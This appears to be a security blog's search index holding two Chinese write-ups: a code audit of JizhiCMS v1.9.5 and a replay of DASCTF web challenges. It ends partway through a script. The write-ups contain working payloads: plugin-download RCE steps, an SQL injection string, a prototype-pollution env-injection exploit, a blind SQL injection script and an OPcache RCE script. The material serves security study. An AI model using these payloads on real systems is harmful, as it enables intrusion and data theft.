<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>从0学代码审计——极致CMS v1.9.5</title>
      <link href="/2023/12/07/%E4%BB%8E0%E5%AD%A6%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E2%80%94%E2%80%94%E6%9E%81%E8%87%B4cms-v1-9-5/"/>
      <url>/2023/12/07/%E4%BB%8E0%E5%AD%A6%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E2%80%94%E2%80%94%E6%9E%81%E8%87%B4cms-v1-9-5/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-框架基础"><a href="#0x01-框架基础" class="headerlink" title="0x01 框架基础"></a>0x01 框架基础</h2><p>环境搭建这块还是比较容易的，github可以下载任意版本的极致CMS，下载源码有注册脚本，本地只需要新建一个数据库即可安装成功。下载链接：<a href="https://github.com/Cherry-toto/jizhicms">https://github.com/Cherry-toto/jizhicms</a></p><p>下载后的目录结构如下：</p><img src="/2023/12/07/%E4%BB%8E0%E5%AD%A6%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E2%80%94%E2%80%94%E6%9E%81%E8%87%B4cms-v1-9-5/1.png" class><p>这块代码的底层使用Frphp框架，该框架目录结构如下：</p><img src="/2023/12/07/%E4%BB%8E0%E5%AD%A6%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E2%80%94%E2%80%94%E6%9E%81%E8%87%B4cms-v1-9-5/2.png" class><p>白盒审计框架首先要弄懂该框架是怎么路由调度的，以及相关业务代码是怎么在游览器通过url访问的。做个测试，通过后台登录的功能调试代码，分析实现登录的业务逻辑是怎么实现的。以上的框架目录中有两个入口文件，分别为index.php和admin.php，前者是前台管理的入口，后者是后台管理的入口。</p><img src="/2023/12/07/%E4%BB%8E0%E5%AD%A6%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E2%80%94%E2%80%94%E6%9E%81%E8%87%B4cms-v1-9-5/3.png" class><p>接下来就分析为什么url是这种格式，在admin.php文件里下断点</p><img src="/2023/12/07/%E4%BB%8E0%E5%AD%A6%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E2%80%94%E2%80%94%E6%9E%81%E8%87%B4cms-v1-9-5/4.png" class><p>实例化核心类，run方法启动程序</p><img src="/2023/12/07/%E4%BB%8E0%E5%AD%A6%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E2%80%94%E2%80%94%E6%9E%81%E8%87%B4cms-v1-9-5/5.png" class><p>跟进 route 方法开始获取路由</p><img src="/2023/12/07/%E4%BB%8E0%E5%AD%A6%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E2%80%94%E2%80%94%E6%9E%81%E8%87%B4cms-v1-9-5/6.png" class><p>从 $_SERVER 获取url，读取webconfig配置文件，检测该url是否允许访问</p><img src="/2023/12/07/%E4%BB%8E0%E5%AD%A6%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E2%80%94%E2%80%94%E6%9E%81%E8%87%B4cms-v1-9-5/7.png" class><p>该框架内置有三种url格式，首先会将这三种url格式与当前url进行匹配，如果匹配不成功，就解析当前的url</p><img src="/2023/12/07/%E4%BB%8E0%E5%AD%A6%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E2%80%94%E2%80%94%E6%9E%81%E8%87%B4cms-v1-9-5/8.png" class><p>清除url的入口文件字符串，也就是admin.php</p><img src="/2023/12/07/%E4%BB%8E0%E5%AD%A6%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E2%80%94%E2%80%94%E6%9E%81%E8%87%B4cms-v1-9-5/9.png" class><p>去除 url 的 html 后缀，注释也说了，非常清楚，然后将剩下的 &#x2F;Login&#x2F;index 以斜杠分割成数组</p><img src="/2023/12/07/%E4%BB%8E0%E5%AD%A6%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E2%80%94%E2%80%94%E6%9E%81%E8%87%B4cms-v1-9-5/10.png" class><p>获取控制器名和方法名，随后对控制器名进行拼接与判断</p><img src="/2023/12/07/%E4%BB%8E0%E5%AD%A6%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E2%80%94%E2%80%94%E6%9E%81%E8%87%B4cms-v1-9-5/11.png" class><img src="/2023/12/07/%E4%BB%8E0%E5%AD%A6%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E2%80%94%E2%80%94%E6%9E%81%E8%87%B4cms-v1-9-5/12.png" class><p>调用 LoginController 的 index 方法</p><img src="/2023/12/07/%E4%BB%8E0%E5%AD%A6%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E2%80%94%E2%80%94%E6%9E%81%E8%87%B4cms-v1-9-5/13.png" class><p>该方法就是一个处理登录逻辑的方法，到此路由调度完成。</p><h2 id="0x02-漏洞审计"><a href="#0x02-漏洞审计" class="headerlink" title="0x02 漏洞审计"></a>0x02 漏洞审计</h2><h3 id="任意文件下载RCE"><a href="#任意文件下载RCE" class="headerlink" title="任意文件下载RCE"></a>任意文件下载RCE</h3><p>前台没有什么功能点，全是静态的，而且前台登录也没有具体代码实现。那么重点分析后台管理，用已知的账号密码登录，漏洞点在插件的下载</p><img src="/2023/12/07/%E4%BB%8E0%E5%AD%A6%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E2%80%94%E2%80%94%E6%9E%81%E8%87%B4cms-v1-9-5/14.png" class><p>抓包看一下</p><img src="/2023/12/07/%E4%BB%8E0%E5%AD%A6%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E2%80%94%E2%80%94%E6%9E%81%E8%87%B4cms-v1-9-5/15.png" class><p>url是可控的，按理来说可以任意文件下载，找到插件下载的相关实现代码</p><img src="/2023/12/07/%E4%BB%8E0%E5%AD%A6%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E2%80%94%E2%80%94%E6%9E%81%E8%87%B4cms-v1-9-5/16.png" class><p>从前端获取相关参数信息，创建一个临时文件目录，也就是 tmp_path，Cache_Path就是缓存文件目录。文件名是经过拼接的，所以任意文件下载的只能是zip</p><img src="/2023/12/07/%E4%BB%8E0%E5%AD%A6%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E2%80%94%E2%80%94%E6%9E%81%E8%87%B4cms-v1-9-5/17.png" class><p>创建 tmp_path 这个临时文件，将下载的文件写进这个临时文件里，也可以认为是重命名。</p><p>既然下载的插件是zip，那么肯定会有解压的操作，当 action&#x3D;file-upzip 时，有具体实现代码</p><img src="/2023/12/07/%E4%BB%8E0%E5%AD%A6%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E2%80%94%E2%80%94%E6%9E%81%E8%87%B4cms-v1-9-5/18.png" class><p>首先判断该临时文件是否存在，然后将压缩包解压到 A&#x2F;exts目录下，get_zip_originalsize 函数实现解压功能，写一个执行phpinfo的php文件，压缩成zip，然后在当前目录下开启web服务</p><img src="/2023/12/07/%E4%BB%8E0%E5%AD%A6%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E2%80%94%E2%80%94%E6%9E%81%E8%87%B4cms-v1-9-5/19.png" class><p>抓包修改url，下载构造好的1.zip</p><img src="/2023/12/07/%E4%BB%8E0%E5%AD%A6%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E2%80%94%E2%80%94%E6%9E%81%E8%87%B4cms-v1-9-5/20.png" class><p>下载完成，此时cache目录下多了一个我们下载的zip</p><img src="/2023/12/07/%E4%BB%8E0%E5%AD%A6%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E2%80%94%E2%80%94%E6%9E%81%E8%87%B4cms-v1-9-5/21.png" class><p>然后解压</p><img src="/2023/12/07/%E4%BB%8E0%E5%AD%A6%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E2%80%94%E2%80%94%E6%9E%81%E8%87%B4cms-v1-9-5/22.png" class><p>此时我们构造的1.php已经解压到 A&#x2F;exts 目录下</p><img src="/2023/12/07/%E4%BB%8E0%E5%AD%A6%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E2%80%94%E2%80%94%E6%9E%81%E8%87%B4cms-v1-9-5/23.png" class><p>该目录下的文件可以直接通过文件访问</p><img src="/2023/12/07/%E4%BB%8E0%E5%AD%A6%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E2%80%94%E2%80%94%E6%9E%81%E8%87%B4cms-v1-9-5/24.png" class><p>已经成功getshell了</p><h3 id="sql注入漏洞"><a href="#sql注入漏洞" class="headerlink" title="sql注入漏洞"></a>sql注入漏洞</h3><p>漏洞点在插件的配置这里</p><img src="/2023/12/07/%E4%BB%8E0%E5%AD%A6%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E2%80%94%E2%80%94%E6%9E%81%E8%87%B4cms-v1-9-5/25.png" class><p>找到关键代码</p><img src="/2023/12/07/%E4%BB%8E0%E5%AD%A6%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E2%80%94%E2%80%94%E6%9E%81%E8%87%B4cms-v1-9-5/26.png" class><p>通过url获取id，find查询当前id的信息，此处不存在sql注入漏洞，因为该id的意思是已经安装的插件id，参数id并不完全可控，url上的id只能匹配数字，无法写入sql语句。下面处理POST数据的代码块，使用 setconfigdata 方法可以执行更新的sql语句</p><img src="/2023/12/07/%E4%BB%8E0%E5%AD%A6%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E2%80%94%E2%80%94%E6%9E%81%E8%87%B4cms-v1-9-5/27.png" class><p>存在字符串拼接，单引号闭合，可以执行sql语句</p><img src="/2023/12/07/%E4%BB%8E0%E5%AD%A6%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E2%80%94%E2%80%94%E6%9E%81%E8%87%B4cms-v1-9-5/28.png" class><p>执行报错语句</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1&#x27; and updatexml(1, concat(0x7e, version()),1)#</span><br></pre></td></tr></table></figure><img src="/2023/12/07/%E4%BB%8E0%E5%AD%A6%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E2%80%94%E2%80%94%E6%9E%81%E8%87%B4cms-v1-9-5/29.png" class><p>成功执行我们添加的报错语句，但是报错日志不会回显到页面上。理论上可以通过页面回显不同来盲注，漏洞审计存在即可，就不往下分析利用过程了。</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 极致CMS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF X 0psu3十一月挑战赛   WEB题目复现</title>
      <link href="/2023/12/06/DASCTF-X-0psu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-WEB%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/"/>
      <url>/2023/12/06/DASCTF-X-0psu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-WEB%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>十一月的buu比赛没时间打，后续有时间就打算复现了一下，有一道 java 题环境关了没复现成还是挺可惜的。</p><h2 id="0x02-题目复现"><a href="#0x02-题目复现" class="headerlink" title="0x02 题目复现"></a>0x02 题目复现</h2><h3 id="realrce"><a href="#realrce" class="headerlink" title="realrce"></a>realrce</h3><p>题目附件是源码</p><p>node.js写的，主要看app.js的代码</p><img src="/2023/12/06/DASCTF-X-0psu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-WEB%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/1.png" class><p>就定义了一个根路由，首先分析这个代码比较关键的点</p><p>proc_execSync函数执行命令，将命令执行的结果返回给客户端，所以想要rce，必须对cmd_rce赋值，而cmd_rce属性在代码之前并没有定义，在上面有merge函数处理，可以利用原型链污染对cmd_rce赋值。</p><p>在这个函数里cmd_rce的过滤</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmd_rce.replace(/\r?\n/g,&quot;&quot;)   替换换行符</span><br><span class="line">replace(/[a-zA-Z0-9 ]+=[a-zA-Z0-9 ]+/g,&quot;114514&quot;)   替换形如key=value格式的内容</span><br><span class="line">replace(/(\$\d+)|(\$SHELL)|(\$_)|(\$\()|(\$&#123;)/g,&quot;114514&quot;)    替换形如$132等格式的内容</span><br><span class="line">replace(/(\&#x27;\/)|(\&quot;\/)|(\&quot;\.)|(\&quot;\.)|(\&#x27;~)|(\&quot;~)|(\.\/+)/,&quot;114514&quot;)</span><br><span class="line">replace(/(\&#x27;\/)|(\&quot;\/)|(\&quot;\.)|(\&quot;\.)|(\&#x27;~)|(\&quot;~)|(\.\/+)/,&quot;114514&quot;)    替换例如/path,/dir/格式的内容</span><br></pre></td></tr></table></figure><p>限制的真多，但是在这道题还远远不止，继续往下看</p><p>首先对我们输入的内容进行waf过滤</p><img src="/2023/12/06/DASCTF-X-0psu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-WEB%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/2.png" class><p>类似于一个递归函数，先将输入的内容url解码，然后检测黑名单，这三个就是原型链污染的关键字符串。常规的绕过是不可行的，在捕获异常这可以返回 false，尝试让 decodeURIComponent 函数报错就可以了</p><p>decodeURIComponent 是一个url解码函数，当输入的字符串不满足这个函数解码的格式就会抛出异常，那怎么找到这个错误格式的url编码呢，可以满足上面代码的匹配规则然后遍历url编码</p><p>%ff就能够满足条件</p><img src="/2023/12/06/DASCTF-X-0psu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-WEB%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/3.png" class><p>那么waf就能够绕过成功了，继续往下看，进入到 Door_lock 函数</p><img src="/2023/12/06/DASCTF-X-0psu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-WEB%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/4.png" class><p>要让 Door_lock 函数返回true，即要满足 if判断条件，首先看 LockCylinder 函数</p><img src="/2023/12/06/DASCTF-X-0psu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-WEB%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/5.png" class><p>对输入的内容过滤掉黑名单中的字符，然后赋值为key，key必须要满足为纯字母</p><p>继续看 check_cmd 函数b</p><img src="/2023/12/06/DASCTF-X-0psu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-WEB%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/6.png" class><p>过滤的东西太多了，截图截不下来。该题目的环境变量没删，所以有非预期，执行env即可得到flag</p><img src="/2023/12/06/DASCTF-X-0psu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-WEB%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/7.png" class><p>而出题人写的WP是利用环境变量注入来RCE</p><p><a href="https://www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environment-injection.html">我是如何利用环境变量注入执行任意命令 | 离别歌 (leavesongs.com)</a></p><p>p神好久之前写的了，放官方exp</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;msg&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;%ff&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;age&quot;</span><span class="punctuation">:</span> <span class="number">25</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;city&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Example City&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;cmd_rce&quot;</span><span class="punctuation">:</span><span class="string">&quot;env $&#x27;BASH_FUNC_echo%%=() &#123; id;&#125;&#x27; bash -c &#x27;echo 123&#x27;&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>为啥这个exp能够绕过waf，回头继续看 Door_lock 函数的过滤</p><p>在 check_cmd 函数中首先消去空格再进行过滤，黑名单写的挺多，但是检测的时候比较刁钻了</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (cmd.<span class="title function_">includes</span>(command[i] + <span class="string">&#x27;&amp;&#x27;</span>) || cmd.<span class="title function_">includes</span>(<span class="string">&#x27;&amp;&#x27;</span> + command[i]) || cmd.<span class="title function_">includes</span>(command[i] + <span class="string">&#x27;|&#x27;</span>) || cmd.<span class="title function_">includes</span>(<span class="string">&#x27;|&#x27;</span> + command[i]) || cmd.<span class="title function_">includes</span>(<span class="string">&#x27;;&#x27;</span> + command[i]) || cmd.<span class="title function_">includes</span>(<span class="params"><span class="string">&#x27;(&#x27;</span> + command[i]</span>) || cmd.<span class="title function_">includes</span>(<span class="string">&#x27;/&#x27;</span> + command[i])) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>再看另一个 LockCylinder 函数，它会去掉存在以下黑名单的字符</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[&quot;&amp;&amp;&quot;, &quot;||&quot;, &quot;&amp;&quot;, &quot;|&quot;, &quot;&gt;&quot;, &quot;*&quot;, &quot;+&quot;, &quot;$&quot;, &quot;;&quot;]</span><br></pre></td></tr></table></figure><p>刚开始没太看懂是怎么绕过的，本地贴代码调试一下就明白了，所以说，分析代码还是得多调试</p><img src="/2023/12/06/DASCTF-X-0psu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-WEB%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/8.png" class><p>当遍历到$字符，满足黑名单检测，所以就将 env 字符串放进数组里，把exp分割了</p><p>最后正则检测的时候，只检测第一个数组元素，也就是env，显然是满足条件的。所以该exp是能够绕过waf并且能够任意命令执行。</p><p>waf写的很刁钻，好像是刻意为了满足环境变量注入rce的命令格式来写的，非常好奇还有没有其他能够任意命令执行的waf绕过方式。</p><h3 id="EzPenetration"><a href="#EzPenetration" class="headerlink" title="EzPenetration"></a>EzPenetration</h3><p>题目源自真实渗透案例</p><p>打开题目是一个 wordpress 的站点，扫描了一下目录，有个后台登录，其他的也没啥，看官方WP是用wpscan扫漏洞，但是我kali的wpscan死活扫不到。</p><p>扫出来的是一个sql注入：<strong>Registrations for the Events Calendar &lt; 2.7.6 - Unauthenticated SQL Injection</strong></p><p>查了一下，有poc</p><img src="/2023/12/06/DASCTF-X-0psu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-WEB%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/9.png" class><p>查看语句正确，回显success</p><img src="/2023/12/06/DASCTF-X-0psu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-WEB%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/10.png" class><p>查询语句错误，回显error</p><img src="/2023/12/06/DASCTF-X-0psu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-WEB%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/11.png" class><p>利用不同的回显可以盲注</p><p>稍微修改了一下官方wp的脚本</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /bin/python</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    session = requests.Session()</span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    i = <span class="built_in">len</span>(result)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        i = i + <span class="number">1</span></span><br><span class="line">        head = <span class="number">30</span></span><br><span class="line">        tail = <span class="number">130</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">            mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">            paramsPost = &#123;<span class="string">&quot;email&quot;</span>: <span class="string">&quot;r3tr0young@gmail.com&quot;</span>,</span><br><span class="line">                          <span class="string">&quot;event_id&quot;</span>: <span class="string">f&quot;3 union select 1,2,3,4,5,6,7,8,9,database() from wp_users where 0^(select(select ascii(substr(group_concat(option_name,0x7e,option_value),<span class="subst">&#123;i&#125;</span>,1)) from wp_options where option_id = 15)&gt;<span class="subst">&#123;mid&#125;</span>)-- &quot;</span>&#125;</span><br><span class="line">            cookies = &#123;<span class="string">&quot;wordpress_test_cookie&quot;</span>: <span class="string">&quot;WP%20Cookie%20check&quot;</span>&#125;</span><br><span class="line">            response = session.post(<span class="string">&quot;http://node4.buuoj.cn:26770/wp-admin/admin-ajax.php?action=rtec_send_unregister_link&quot;</span>, data=paramsPost,cookies=cookies)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;success&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">                head = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                tail = mid</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> head != <span class="number">30</span>:</span><br><span class="line">            result += <span class="built_in">chr</span>(head)</span><br><span class="line">            <span class="built_in">print</span>(result)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>查询 wp_options 表的 option_name 和 option_value 两个字段，表中第十五行，爆破出管理员邮箱</p><img src="/2023/12/06/DASCTF-X-0psu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-WEB%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/12.png" class><p>在表中第十六行中，找到了类似于密码的东西</p><img src="/2023/12/06/DASCTF-X-0psu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-WEB%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/13.png" class><p>在后台登录页有个忘记密码，可以通过邮箱重置密码，然后登录到后台</p><p>复现的时候邮箱好像不管用了，登录到后台后安装 wp-file-manager 漏洞插件来rce。</p><h3 id="single-php"><a href="#single-php" class="headerlink" title="single_php"></a>single_php</h3><p>0解题，打开题目，用 highlight_file 高亮函数来显示代码</p><img src="/2023/12/06/DASCTF-X-0psu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-WEB%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/14.png" class><p>一段很短的php代码，存在反序列化，但是只能执行一个无参的函数，例如phpinfo()，在上面html里还有另一个文件</p><img src="/2023/12/06/DASCTF-X-0psu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-WEB%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/15.png" class><img src="/2023/12/06/DASCTF-X-0psu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-WEB%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/16.png" class><p>只允许本地回环ip访问，看来只能打ssrf了，可以上传压缩包，并且解压到tmp目录下。唯一执行命令的地方就是exec，本来想着在上传的文件名注入命令，单引号闭合可以任意命令执行，但是回头再看，对上传的文件名重命名了，用的是tmp_name，貌似不可控</p><p>官方wp说是利用OPCACHE缓存文件来RCE，在比赛中我应该写不出来，因为根本没了解这个</p><p>现在开始了解，OPCACHE是php的一个扩展。当用户发出一个请求时，解析当前的php文件生成计算机代码opcode，然后执行。而OPCACHE扩展将解析好的php文件的字节码存放在共享内存中，当再次请求的php文件没有变化，它会去共享内存里拿，而避免了再次编译，直接执行内存里的opcode。减少计算机的开销。</p><p>相关文章：<a href="https://www.cnblogs.com/xhds/p/13239331.html"><a href="https://www.cnblogs.com/xhds/p/13239331.html">php7的Opcache getshell</a></a></p><p>执行phpinfo()；看看题目中是否开启了这个扩展</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">siroha</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$koi</span> = <span class="keyword">array</span>(<span class="string">&quot;zhanjiangdiyishenqing&quot;</span>=&gt;<span class="string">&quot;phpinfo&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">siroha</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><img src="/2023/12/06/DASCTF-X-0psu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-WEB%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/17.png" class><p>将缓存文件放在了tmp目录下，题目环境为8.2.10的php环境</p><p>本地拉一个相同环境的docker，下载该OPCACHE扩展，在自己容器上新建一个phpinfo，运行</p><img src="/2023/12/06/DASCTF-X-0psu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-WEB%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/18.png" class><p>在该目录下生成了一个phpinfo.php.bin二进制文件，也就是解析后的opcode</p><p>我们本地写一个能够任意命令执行的index.php，生成的缓存文件上传题目服务器，并且覆盖掉原有的缓存文件，当再次访问index.php，该文件的代码不发生变化，会直接执行缓存文件里的opcode，就能rce了。将本地的缓存文件下载下来，用010打开看</p><img src="/2023/12/06/DASCTF-X-0psu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-WEB%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/19.png" class><p>有一串md5值，也是tmp目录下的文件名，叫做system_id，计算的php代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">md5</span>(<span class="string">&quot;8.2.6API420220829,NTSBIN_4888(size_t)8\002&quot;</span>));</span><br></pre></td></tr></table></figure><p>而在题目环境中又开启了时间戳验证</p><img src="/2023/12/06/DASCTF-X-0psu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-WEB%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/20.png" class><p>所以只能写脚本上传了。首先本地docker里编写一个可以rce的index.php</p><img src="/2023/12/06/DASCTF-X-0psu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-WEB%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/21.png" class><p>然后将它的缓存文件下载下来，用脚本修改时间戳，并且伪造上传数据</p><p>直接贴上官方WP里的python脚本</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> tarfile</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">url = <span class="string">&quot;http://12943d13-4210-4cf7-8219-8aa4761aef73.node4.buuoj.cn:81/?LuckyE=filectime&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">timec</span>():</span><br><span class="line">    pattern = <span class="string">r&quot;\d&#123;10&#125;&quot;</span>  <span class="comment">#匹配十位数字</span></span><br><span class="line">    timeres = requests.get(url=url)</span><br><span class="line">    <span class="keyword">match</span> = re.search(<span class="string">r&quot;int\((\d&#123;10&#125;)\)&quot;</span>,timeres.text)<span class="comment">#从响应包中提取到时间戳信息</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        ten_digit_number = <span class="keyword">match</span>.group(<span class="number">1</span>)</span><br><span class="line">        <span class="built_in">print</span>(ten_digit_number)</span><br><span class="line">        <span class="keyword">return</span> ten_digit_number  <span class="comment">#返回时间戳</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;dame&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">split_string_into_pairs</span>(<span class="params">input_string</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(input_string) % <span class="number">2</span> != <span class="number">0</span>:</span><br><span class="line">        <span 